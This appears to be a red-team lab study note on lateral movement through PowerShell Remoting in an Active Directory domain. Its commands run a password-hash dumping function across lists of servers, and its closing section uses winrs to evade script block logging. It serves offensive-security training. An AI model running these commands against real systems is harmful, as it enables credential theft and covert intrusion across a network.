
# Lateral Movement - PowerShell Remoting
#remoting

Commands can be used for powershell remoting
```
New-PSSession
Enter-PSSession
```

So, If we need to enter a new powershell session as `dcorp-adminsrv` : 
```
Enter-PSSession dcorp-adminsrv
```

Another method of running commands across domain or multiple machines with admin access : 

* One-to-Many
* Also known as Fan-out remoting.
* Using : 
```
Invoke-Command
```

* Use below to execute commands or scriptblocks:
```
Invoke-Command -Scriptblock {Get-Process} -ComputerName
(Get-Content <list_of_servers>)

Invoke-Command -Scriptblock {$env:computername;$env:username} -ComputerName dcorp-adminsrv

Invoke-Command -Scriptblock {whoami} -ComputerName (cat c:\AD\Tools\server.txt)
```

* Use below to execute scripts from files
```
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

* Use below to execute locally loaded function on the remote machines:
```
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

* In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
```
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

* Use below to execute "Stateful" commands using Invoke-Command:
```
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

##  PowerShell Remoting - Tradecraft

* PowerShell remoting supports the system-wide transcripts and deep
script block logging.
*  We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
```
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname

winrm -r:dcorp-adminsrv set computername
```

• We can also use winrm.vbs and COM objects of WSMan object - https://github.com/bohops/WSMan-WinRM
